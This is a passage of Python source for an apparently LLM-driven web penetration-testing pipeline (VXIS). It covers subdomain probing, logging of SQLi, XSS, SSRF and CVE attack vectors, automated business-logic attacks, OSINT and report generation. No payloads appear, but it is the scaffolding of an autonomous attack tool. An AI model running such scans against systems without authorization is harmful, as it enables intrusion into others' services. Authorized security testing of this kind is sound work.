                description=f"Missing: {', '.join(missing)}|||누락: {', '.join(missing)}",
                target=ctx.target)
            try:
                ctx.score_tracker.record_finding(_hf.id, "WEB-MISCONF-004", level=1)
            except Exception:
                pass

        # 서브도메인 열거 (localhost/IP 타겟은 스킵 — 의미 없는 SSL 에러 방지)
        from urllib.parse import urlparse
        base_domain = urlparse(ctx.target).netloc
        root_domain = ".".join(base_domain.split(".")[-2:])

        skip_subdomain = (
            "localhost" in base_domain
            or base_domain.startswith("127.")
            or base_domain.startswith("192.168.")
            or base_domain.startswith("10.")
            or ":" in base_domain.split(".")[-1]  # port-only like localhost:8081
        )

        if skip_subdomain:
            logger.info("  Subdomain enum skipped (local/IP target)")
        else:
            for sub in ["api", "admin", "staging", "dev", "internal", "dashboard",
                         "cdn", "static", "auth", "mail", "monitor"]:
                fqdn = f"{sub}.{root_domain}"
                try:
                    sub_s = await mgr.get_session(f"https://{fqdn}")
                    sr = await sub_s.get("/")
                    ctx.subdomains.append({
                        "fqdn": fqdn, "status": sr.status, "live": True,
                        "headers": dict(sr.headers), "body_preview": sr.text[:200],
                    })
                    logger.info("  [LIVE] %s → %d", fqdn, sr.status)
                except Exception:
                    pass

        # OWASP 전체 순회 (Phase 2 에이전트가 해야 하지만, 아직 에이전트가 Pipeline에 통합 안 된 상태에서
        # Phase 4 CPR이 직접 수행)
        # ... (여기에 brain_scan.py의 PROBE 로직이 들어감)
        # → 추후 Phase 2 에이전트로 이관

        # ── Eyes 스크린샷 캡처 (Playwright 활성화된 경우만) ──
        try:
            from vxis.interaction.eyes import is_available as _eyes_available
            if _eyes_available() and ctx.target_profile.get("available_senses", {}).get("eyes"):
                from pathlib import Path as _Path
                shot_dir = _Path("reports/screenshots") / (ctx.scan_id or "default")
                shot_dir.mkdir(parents=True, exist_ok=True)

                # 캡처 대상: homepage + finding 발생 affected_components 중 URL path
                shot_targets: list[tuple[str, str]] = [("/", "homepage")]
                seen_paths: set[str] = {"/"}
                for _f in list(ctx.findings):
                    comp = (_f.affected_component or "").strip()
                    if comp.startswith("/") and comp not in seen_paths and len(comp) < 200:
                        label = f"finding_{_f.id}".replace("/", "_")
                        shot_targets.append((comp, label))
                        seen_paths.add(comp)
                        if len(shot_targets) >= 6:
                            break

                for path_url, label in shot_targets:
                    try:
                        out_path = shot_dir / f"{label}.png"
                        sc_res = await ctrl.execute(InteractionAction(
                            intent=InteractionIntent.SCREENSHOT,
                            url=path_url,
                        ))
                        if sc_res.success and sc_res.screenshot_path:
                            try:
                                import shutil as _shutil
                                _shutil.move(sc_res.screenshot_path, str(out_path))
                            except Exception:
                                if getattr(ctrl, "_page", None) is not None:
                                    await ctrl._page.screenshot(path=str(out_path))  # type: ignore[attr-defined]
                            ctx.screenshots[label] = str(out_path)
                            logger.info("  [SHOT] %s → %s", path_url, out_path)
                    except Exception as _se:
                        logger.debug("  Screenshot failed for %s: %s", path_url, _se)
        except Exception as _e:
            logger.debug("  Eyes screenshot block skipped: %s", _e)

        # Cleanup — 리소스 누수 방지 (예외 시에도 실행하려면 phase body 전체를 try로 감싸야 하나
        # 이는 indent 변경이 필요 — 대신 try/except로 cleanup만 보호)
        try:
            await ctrl.stop()
        except Exception:
            logger.debug("  ctrl.stop() failed (ignored)", exc_info=True)
        try:
            await mgr.close_all()
        except Exception:
            logger.debug("  mgr.close_all() failed (ignored)", exc_info=True)

        try:
            ctx.score_tracker.record_phase_complete("Phase 4: CPR — Hands/Eyes/X-Ray Connect")
        except Exception:
            pass

    async def _phase5_special(self, ctx: ScanContext) -> None:
        """Phase 5: IoT/VoIP/Web3 — 해당 시에만. 현대 CVE 인젝션 벡터는 항상 기록."""
        # Modern CVE injection vectors — always attempted regardless of target type
        # LLM/AI 인젝션, CMS RCE, LLM 프롬프트 인젝션은 범용 웹 타깃에도 적용
        try:
            for vid in [
                "WEB-INJECT-018",  # AI/LLM Workflow Code Injection (Langflow)
                "WEB-INJECT-019",  # Laravel Livewire RCE (CVE-2025-54068)
                "WEB-INJECT-020",  # CMS Code Injection (Craft CMS CVE-2025-32432)
                "WEB-INJECT-021",  # LLM Prompt Injection
            ]:
                ctx.score_tracker.record_vector_attempt(vid)
        except Exception:
            pass

        is_iot = any(k in " ".join(ctx.tech_stack).lower() for k in ["mqtt", "coap", "zigbee", "ble"])
        if is_iot:
            logger.info("  IoT indicators detected — running IoT agents")
            try:
                # Phase 5 injection vectors
                for vid in [
                    "WEB-SQLI-001", "WEB-SQLI-002", "WEB-SQLI-003", "WEB-SQLI-004",
                    "WEB-SQLI-005", "WEB-SQLI-006",
                    "WEB-NOSQL-001", "WEB-NOSQL-002",
                    "WEB-CMDI-001", "WEB-CMDI-002",
                    "WEB-LDAP-001", "WEB-XPATH-001", "WEB-SSTI-001",
                    "WEB-XXE-001", "WEB-DESER-001", "WEB-UPLOAD-001",
                ]:
                    ctx.score_tracker.record_vector_attempt(vid)
                ctx.score_tracker.record_phase_complete("Phase 5: Special Agents (IoT/VoIP/Web3)")
            except Exception:
                pass
        else:
            logger.info("  No IoT/VoIP/Web3 indicators — skipping")
            try:
                ctx.score_tracker.record_phase_skipped(
                    "Phase 5: Special Agents (IoT/VoIP/Web3)",
                    "No IoT/VoIP/Web3 indicators in tech stack",
                )
            except Exception:
                pass

        # ── Multi-step Business Logic Attack (Brain-First) ──
        try:
            await self._phase_business_logic(ctx)
        except Exception as exc:
            logger.warning("  [BIZ-LOGIC] phase failed: %s", exc)

    async def _phase_business_logic(self, ctx: ScanContext) -> None:
        """Brain이 앱 상태머신을 학습하고 각 전환점에서 비즈니스 로직 공격을 수행."""
        from vxis.agent.business_logic import BusinessLogicAnalyzer
        from vxis.models.finding import Severity

        logger.info("  [BIZ-LOGIC] Multi-step Business Logic Attack starting")

        for vid in ("WEB-BIZ-001", "WEB-BIZ-002", "WEB-BIZ-003", "WEB-BIZ-004", "WEB-BIZ-005"):
            try:
                ctx.score_tracker.record_vector_attempt(vid)
            except Exception:
                pass

        session = getattr(ctx, "_brain_session", None)
        if session is None:
            logger.info("  [BIZ-LOGIC] no _brain_session — skipping live attacks")
            return

        analyzer = BusinessLogicAnalyzer()
        try:
            graph = await analyzer.learn_state_graph(
                target=ctx.target,
                session=session,
                brain=self.brain,
                initial_endpoints=list(ctx.api_endpoints or []),
                tech_stack=list(ctx.tech_stack or []),
            )
        except Exception as exc:
            logger.warning("  [BIZ-LOGIC] learn_state_graph error: %s", exc)
            return

        if not graph.edges:
            logger.info("  [BIZ-LOGIC] Brain returned no transitions — nothing to attack")
            return

        try:
            results = await analyzer.attack_transitions(graph, session, self.brain, ctx)
        except Exception as exc:
            logger.warning("  [BIZ-LOGIC] attack_transitions error: %s", exc)
            return

        successes = [r for r in results if r.success]
        logger.info("  [BIZ-LOGIC] %d transitions tested, %d apparent successes",
                    len(results), len(successes))

        title_map = {
            "WEB-BIZ-001": ("Business Logic — Negative Value Accepted",
                            "비즈니스 로직 — 음수 값 수락"),
            "WEB-BIZ-002": ("Business Logic — State Transition Skip",
                            "비즈니스 로직 — 상태 전환 우회"),
            "WEB-BIZ-003": ("Business Logic — Race Condition on Transaction",
                            "비즈니스 로직 — 트랜잭션 경쟁 상태"),
            "WEB-BIZ-004": ("Business Logic — Transaction Replay Allowed",
                            "비즈니스 로직 — 트랜잭션 재전송 허용"),
            "WEB-BIZ-005": ("Business Logic — Privilege/Identifier Tampering",
                            "비즈니스 로직 — 권한/식별자 변조"),
        }

        for r in successes:
            try:
                ctx.score_tracker.record_vector_found(r.vector_id)
            except Exception:
                pass
            en, ko = title_map.get(r.vector_id, (r.attack_type, r.attack_type))
            try:
                ctx.add_finding(
                    target=ctx.target,
                    title=f"{en}|||{ko}",
                    description=(
                        f"Transition: {r.transition.from_state} -> {r.transition.to_state}\n"
                        f"Attack: {r.attack_type}\n"
                        f"Reasoning: {r.reasoning}\n"
                        f"Evidence:\n{r.evidence}"
                        f"|||"
                        f"전환: {r.transition.from_state} → {r.transition.to_state}\n"
                        f"공격 유형: {r.attack_type}\n"
                        f"분석: {r.reasoning}\n"
                        f"증거:\n{r.evidence}"
                    ),
                    severity=Severity.high,
                    finding_type="business_logic",
                    affected_component=r.transition.endpoint or ctx.target,
                )
            except Exception as exc:
                logger.debug("  [BIZ-LOGIC] add_finding failed: %s", exc)

        try:
            ctx.score_tracker.record_phase_complete("Phase 5: Business Logic Attack")
        except Exception:
            pass

    async def _phase7_hardware(self, ctx: ScanContext) -> None:
        """Phase 7: Hardware agents — 해당 시에만."""
        logger.info("  Web target — hardware agents N/A")
        try:
            # SSRF 벡터는 Phase 7과 연관 (웹 타깃에서도 SSRF 테스트)
            for vid in ["WEB-SSRF-001", "WEB-SSRF-002", "WEB-SSRF-003"]:
                ctx.score_tracker.record_vector_attempt(vid)
            ctx.score_tracker.record_phase_skipped(
                "Phase 7: Hardware Agents (DMA/SS7/Cold Boot)",
                "Web target — hardware agents N/A",
            )
        except Exception:
            pass

    async def _phase8_synthesis(self, ctx: ScanContext) -> None:
        """Phase 8: Cross-Protocol Synthesis — 다중 레이어 체인 합성."""
        try:
            # Phase 8 대응 벡터: 접근 제어, IDOR, 권한 상승
            for vid in [
                "WEB-AC-001", "WEB-AC-002", "WEB-AC-003", "WEB-AC-004",
                "WEB-API-001", "WEB-API-005",
            ]:
                ctx.score_tracker.record_vector_attempt(vid)
        except Exception:
            pass

        try:
            # Phase 8 대응 벡터: 클라이언트 사이드 인젝션 — XSS/CSRF/Open Redirect
            # Client-side injection vectors — XSS/CSRF/Open Redirect
            for vid in [
                "WEB-XSS-001",   # Reflected XSS | 반사형 XSS
                "WEB-XSS-002",   # Stored XSS | 저장형 XSS
                "WEB-XSS-003",   # DOM-Based XSS | DOM 기반 XSS
                "WEB-XSS-004",   # Mutation XSS (mXSS) | Mutation XSS
                "WEB-CSRF-001",  # Cross-Site Request Forgery | 사이트 간 요청 위조
                "WEB-MISCONF-006",  # Open Redirect | 오픈 리다이렉트
            ]:
                ctx.score_tracker.record_vector_attempt(vid)
        except Exception:
            pass

        try:
            from vxis.synthesis.cross_protocol import CrossProtocolSynthesizer
            synth = CrossProtocolSynthesizer()
            # 발견된 취약점들을 크로스 레이어로 합성
            chains = await synth.synthesize(ctx.findings) if hasattr(synth, 'synthesize') else []
            ctx.attack_chains.extend(chains)
            logger.info("  Synthesized %d cross-protocol chains", len(chains))
        except Exception as exc:
            logger.info("  Cross-Protocol Synthesis: %s", exc)

        try:
            ctx.score_tracker.record_phase_complete("Phase 8: Cross-Protocol Synthesis")
        except Exception:
            pass

    # Phase 9 (CVE Watch) → GH Actions cve-watch.yml (매시간)
    # Phase 10 (Red vs Blue) → 미래 구현 예정

    async def _phase11_mutation(self, ctx: ScanContext) -> None:
        """Phase 11: Chain Mutation — 대체 공격 경로 탐색."""
        try:
            # Phase 11 대응 벡터: WebSocket, GraphQL
            for vid in ["WEB-WSS-001", "WEB-API-003", "WEB-API-004"]:
                ctx.score_tracker.record_vector_attempt(vid)
        except Exception:
            pass

        try:
            from vxis.mutation.chain_mutator import ChainMutator
            mutator = ChainMutator()
            for chain in ctx.attack_chains:
                mutations = await mutator.mutate(chain) if hasattr(mutator, 'mutate') else []
                ctx.chain_mutations.extend(mutations)
            logger.info("  Generated %d chain mutations", len(ctx.chain_mutations))
        except Exception as exc:
            logger.info("  Chain Mutation: %s", exc)

        try:
            ctx.score_tracker.record_phase_complete("Phase 11: Chain Mutation — Alternative Attack Paths")
        except Exception:
            pass

    async def _phase12_evolution(self, ctx: ScanContext) -> None:
        """Phase 12: Self-Evolving — 커버리지 갭 분석 + Knowledge Store에 결과 축적."""
        try:
            # Phase 12 대응 벡터: Rate Limiting
            ctx.score_tracker.record_vector_attempt("WEB-API-002")
        except Exception:
            pass

        try:
            from vxis.evolution.agent_synthesizer import AgentSynthesizer
            synth = AgentSynthesizer()
            gaps = synth.analyze_gaps(ctx.findings) if hasattr(synth, 'analyze_gaps') else []
            ctx.coverage_gaps = gaps
            if gaps:
                print(f"  [EVOLVE] {len(gaps)} coverage gaps identified", flush=True)
                for g in gaps[:3]:
                    _desc = str(g) if not hasattr(g, 'description') else g.description
                    print(f"    - {_desc[:80]}", flush=True)
            else:
                print("  [EVOLVE] No coverage gaps — full coverage", flush=True)

            # 갭 정보를 Knowledge Store에 축적 → 다음 스캔에서 활용
            if gaps:
                try:
                    from vxis.knowledge.store import KnowledgeStore, ExecutionRecord
                    store = KnowledgeStore()
                    for gap in gaps:
                        gap_desc = str(gap) if not hasattr(gap, 'description') else gap.description
                        store.record_execution(ExecutionRecord(
                            tool="evolution_gap_analysis",
                            context_signature=f"gap+{ctx.target_type or 'web'}",
                            args_summary=gap_desc[:200],
                            effectiveness=0.0,  # 갭 = 효과 없던 영역
                            findings_produced=0,
                            finding_types=[],
                            target_tech=list(ctx.tech_stack)[:5],
                        ))
                    logger.info("  Stored %d gaps to Knowledge Store", len(gaps))
                except Exception as store_exc:
                    logger.debug("  Knowledge Store gap storage: %s", store_exc)
        except Exception as exc:
            logger.info("  Self-Evolution: %s", exc)

        try:
            ctx.score_tracker.record_phase_complete("Phase 12: Self-Evolving Agent — Coverage Gap Analysis")
        except Exception:
            pass

    async def _phase13_biometrics(self, ctx: ScanContext) -> None:
        """Phase 13: Behavioral Biometrics — OSINT."""
        try:
            # Phase 13 대응 벡터: 클라우드 미스컨피그
            for vid in ["WEB-INFRA-003", "WEB-INFRA-004"]:
                ctx.score_tracker.record_vector_attempt(vid)
        except Exception:
            pass

        try:
            from vxis.biometrics.analyzer import BehavioralAnalyzer
            analyzer = BehavioralAnalyzer()
            from urllib.parse import urlparse
            _host = urlparse(ctx.target.replace("ghost://", "https://")).netloc
            domain = _host.split(".")[-2] if "." in _host else _host
            result = analyzer.analyze(domain) if hasattr(analyzer, 'analyze') else {}
            ctx.biometrics = result
            _hvt = result.get("high_value_targets", []) if isinstance(result, dict) else []
            print(f"  [OSINT] Domain: {domain} | HVT: {len(_hvt)} targets", flush=True)
        except Exception as exc:
            logger.debug("  Biometrics: %s", exc)

        try:
            ctx.score_tracker.record_phase_complete("Phase 13: Behavioral Biometrics (OSINT)")
        except Exception:
            pass

    # Phase 14 (Forecast) → GH Actions domain-intel.yml (매일)

    async def _phase15_digital_twin(self, ctx: ScanContext) -> None:
        """Phase 15: Digital Twin — 사전 시뮬레이션."""
        try:
            from vxis.twin.simulator import DigitalTwinSimulator
            sim = DigitalTwinSimulator()
            _clean_target = ctx.target.replace("ghost://", "https://")
            result = sim.simulate(_clean_target) if hasattr(sim, 'simulate') else {}
            ctx.twin_results = result
            _services = result.get("services", []) if isinstance(result, dict) else []
            print(f"  [TWIN] Simulated {len(_services)} services", flush=True)
        except Exception as exc:
            logger.debug("  Digital Twin: %s", exc)

        try:
            ctx.score_tracker.record_phase_complete("Phase 15: Digital Twin Pre-Simulation")
        except Exception:
            pass

    async def _enrich_findings_with_brain(self, ctx: ScanContext) -> None:
        """Brain에게 각 finding의 상세 정보를 요청하여 CLAUDE.md 리포트 규칙에 맞게 보강.

        description → WHAT/HOW/IMPACT/PoC/ATTACK PATH (bilingual)
        remediation → Immediate/Short-term/Long-term (bilingual)
        cvss, cwe_ids, evidence, references 추가
        """
        from vxis.agent.brain import AgentBrain as _ABrain
        if not isinstance(self.brain, _ABrain):
            return
        if not ctx.findings:
            return

        print(f"  [ENRICH] Enriching {len(ctx.findings)} findings with Brain...", flush=True)

        from vxis.models.finding import CVSSVector, Evidence, Reference, MitreAttack

        for i, finding in enumerate(ctx.findings):
            # 이미 보강된 finding은 건너뛰기 (description에 WHAT이 있으면 이미 상세)
            if "WHAT" in finding.description and "HOW" in finding.description:
                continue

            system_prompt = (
                "You are a senior security consultant writing an NCC Group style finding report. "
                "For the given finding, generate DETAILED enrichment data in JSON format.\n\n"
                "REQUIRED JSON schema:\n"
                "{\n"
                '  "description_en": "WHAT — ...\\nHOW — Step 1: ... Step N: ...\\nIMPACT — \\n- bullet1\\n- bullet2\\nPoC — Request/Response raw\\nATTACK PATH — ...",\n'
                '  "description_ko": "취약점 설명(WHAT) — ...\\n공격 시나리오(HOW) — 1단계: ...\\n비즈니스 영향(IMPACT) — \\n- ...\\n개념 증명(PoC) — ...\\n공격 경로(ATTACK PATH) — ...",\n'
                '  "remediation_en": "Immediate: ...\\nShort-term: ...\\nLong-term: ...",\n'
                '  "remediation_ko": "즉시 조치: ...\\n단기 조치: ...\\n장기 조치: ...",\n'
                '  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",\n'
                '  "cvss_score": 9.1,\n'
                '  "cwe_ids": ["CWE-89"],\n'
                '  "mitre_technique_id": "T1190",\n'
                '  "mitre_technique_name": "Exploit Public-Facing Application",\n'
                '  "mitre_tactic": "Initial Access",\n'
                '  "references": [{"title": "OWASP ...", "url": "https://..."}]\n'
                "}\n\n"
                "OUTPUT RULE: Your ENTIRE response must be a single raw JSON object. "
                "No text before {. No text after }. No markdown. No explanation."
            )

            user_prompt = (
                f"Finding: {finding.title}\n"
                f"Type: {finding.finding_type}\n"
                f"Severity: {finding.severity.value}\n"
                f"Target: {finding.target}\n"
                f"Affected component: {finding.affected_component}\n"
                f"Current description: {finding.description}\n"
                f"Endpoint context: This is a {ctx.target} vulnerability scan finding.\n\n"
                "Generate the complete enrichment JSON."
            )

            try:
                response = self.brain._call_llm_with_fallback(system_prompt, user_prompt)
                if not response:
                    continue
                enriched = _parse_llm_json(response)
                if not enriched:
                    continue

                # description 보강
                desc_en = enriched.get("description_en", "")
                desc_ko = enriched.get("description_ko", "")
                if desc_en and desc_ko:
                    finding.description = f"{desc_en}|||{desc_ko}"

                # remediation 보강
                rem_en = enriched.get("remediation_en", "")
                rem_ko = enriched.get("remediation_ko", "")
                if rem_en and rem_ko:
                    finding.remediation = f"{rem_en}|||{rem_ko}"

                # CVSS
                cvss_vec = enriched.get("cvss_vector", "")
                cvss_score = enriched.get("cvss_score", 0)
                if cvss_vec and "CVSS:3.1/" in cvss_vec:
                    try:
                        finding.cvss = CVSSVector(vector_string=cvss_vec, base_score=float(cvss_score))
                    except Exception:
                        pass

                # CWE
                cwe_list = enriched.get("cwe_ids", [])
                if cwe_list and isinstance(cwe_list, list):
                    finding.cwe_ids = cwe_list

                # MITRE ATT&CK
                mitre_tid = enriched.get("mitre_technique_id", "")
                mitre_name = enriched.get("mitre_technique_name", "")
                mitre_tactic = enriched.get("mitre_tactic", "")
                if mitre_tid:
                    try:
                        finding.mitre_attack = MitreAttack(
                            technique_id=mitre_tid,
                            technique_name=mitre_name,
                            tactic=mitre_tactic,
                        )
                    except Exception:
                        pass

                # Evidence (HTTP request/response from original description)
                if not finding.evidence:
                    finding.evidence = [Evidence(
                        evidence_type="http_request_response",
                        title=f"Probe result for {finding.affected_component}",
                        content=f"Endpoint: {finding.affected_component}\nFinding type: {finding.finding_type}\nSeverity: {finding.severity.value}",
                    )]

                # References
                refs = enriched.get("references", [])
                if refs and isinstance(refs, list) and not finding.references:
                    finding.references = [
                        Reference(title=r.get("title", ""), url=r.get("url", ""))
                        for r in refs if r.get("url")
                    ]

                print(f"    ✓ {finding.id}: enriched", flush=True)

            except Exception as exc:
                logger.debug("  [ENRICH-FAIL] %s: %s", finding.id, exc)

    async def _phase6_report(self, ctx: ScanContext) -> None:
        """Phase 6: NCC Group 스타일 리포트 생성."""
        try:
            # Phase 6 대응 벡터: XSS, CSRF, Open Redirect
            for vid in ["WEB-XSS-001", "WEB-XSS-002", "WEB-XSS-003", "WEB-XSS-004",
                        "WEB-CSRF-001", "WEB-MISCONF-006"]:
                ctx.score_tracker.record_vector_attempt(vid)
        except Exception:
            pass

        # ── Brain으로 findings 보강 (CLAUDE.md 리포트 규칙 준수) ──
        await self._enrich_findings_with_brain(ctx)

        from vxis.report.generator import ReportGenerator, ReportData
        from vxis.models.finding import Severity
        from pathlib import Path

        c = sum(1 for f in ctx.findings if f.severity == Severity.critical)
        h = sum(1 for f in ctx.findings if f.severity == Severity.high)
        m = sum(1 for f in ctx.findings if f.severity == Severity.medium)
        low = sum(1 for f in ctx.findings if f.severity == Severity.low)
        i = sum(1 for f in ctx.findings if f.severity == Severity.informational)

        phases_str = ", ".join(ctx.phases_completed)
        deferred_str = f"{sum(1 for a in ctx.deferred_actions if a.approved)}/{len(ctx.deferred_actions)} approved"

        # Hardcoded fallback summary (bilingual)
        _fallback_en = (
            f"VXIS ScanPipeline executed all applicable phases against {ctx.target}.\n"
            f"Phases completed: {len(ctx.phases_completed)}\n"
            f"Total: {len(ctx.findings)} findings (C:{c} H:{h} M:{m} L:{low} I:{i})\n"
            f"Deferred actions: {deferred_str}\n"
            f"Duration: {ctx.duration_seconds:.0f}s"
        )
        _fallback_ko = (
            f"VXIS ScanPipeline이 {ctx.target} 대상으로 모든 해당 단계를 수행했습니다.\n"
            f"완료된 단계: {len(ctx.phases_completed)}\n"
            f"총 발견: {len(ctx.findings)}건 (C:{c} H:{h} M:{m} L:{low} I:{i})\n"
            f"보류된 액션: {deferred_str}\n"
            f"소요 시간: {ctx.duration_seconds:.0f}초"
        )
        exec_summary = f"{_fallback_en}|||{_fallback_ko}"

        # AI-generated bilingual executive summary (LLM via ai_summary module)
        try:
            import os
            from vxis.report.ai_summary import generate_executive_summary
            _vxis_score = getattr(ctx, "vxis_score", None)
            _api_key = os.environ.get("ANTHROPIC_API_KEY")
            _ai_summary = await generate_executive_summary(
                findings=ctx.findings,
                client_name="VXIS Client",
                api_key=_api_key,
                target=ctx.target,
                vxis_score=_vxis_score,
                bilingual=True,
            )
            if _ai_summary and "|||" in _ai_summary:
                exec_summary = _ai_summary
        except Exception as _e:
            logger.warning("ai_summary generation failed, using fallback: %s", _e)

        rd = ReportData(
            scan_id=ctx.scan_id,
            client_name="",  # 외부에서 설정
            target=ctx.target,
            scan_date=ctx.started_at.strftime("%Y-%m-%d"),
            findings=ctx.findings,
            company_name="VXIS Security",
            author="VXIS ScanPipeline",
            executive_summary=exec_summary,
            methodology=f"Brain-First Pipeline. Phases: {phases_str}",
            screenshots=dict(getattr(ctx, "screenshots", {}) or {}),
        )

        gen = ReportGenerator()
        from urllib.parse import urlparse
        safe_name = urlparse(ctx.target).netloc.replace(".", "_")
        output = Path("reports") / f"VXIS_Pipeline_{safe_name}.html"
        output.parent.mkdir(exist_ok=True)
        gen.generate_html_file(rd, output)
        logger.info("  Report: %s", output)

        try:
            ctx.score_tracker.record_phase_complete("Phase 6: Report Generation — NCC Group Style")
        except Exception:
            pass

    # Phase 17 (Outreach) → 미래 구현 예정

    async def _phase18_collective(self, ctx: ScanContext) -> None:
        """Phase 18: Collective Intelligence — 패턴 공유."""
        try:
            from vxis.knowledge.store import KnowledgeStore, ExecutionRecord
            store = KnowledgeStore()

            # findings → Knowledge Store 축적
            stored = 0
            for finding in ctx.findings:
                try:
                    store.record_execution(ExecutionRecord(
                        tool=f"pipeline:{finding.finding_type}",
                        context_signature=f"{ctx.target_type}+{'+'.join(ctx.tech_stack[:3])}",
                        args_summary=finding.affected_component[:100],
                        effectiveness=1.0,
                        findings_produced=1,
                        finding_types=[finding.finding_type],
                        target_tech=list(ctx.tech_stack)[:5],
                    ))
                    stored += 1
                except Exception:
                    pass

            # 패턴 자동 컴파일 (3회 이상 반복된 패턴 → 컴파일)
            compiled = 0
            try:
                compiled = store._try_compile() if hasattr(store, '_try_compile') else 0
            except Exception:
                pass

            print(f"  [KB] Stored {stored} findings | Compiled {compiled} new patterns", flush=True)
        except Exception as exc:
            logger.debug("  Collective: %s", exc)

        try:
            ctx.score_tracker.record_phase_complete("Phase 18: Collective Intelligence Update")
        except Exception:
            pass

    # Phase 16 (Industry Intel) → GH Actions domain-intel.yml (매일)
    # Phase 19 (Bug Bounty) → 미래 구현 예정
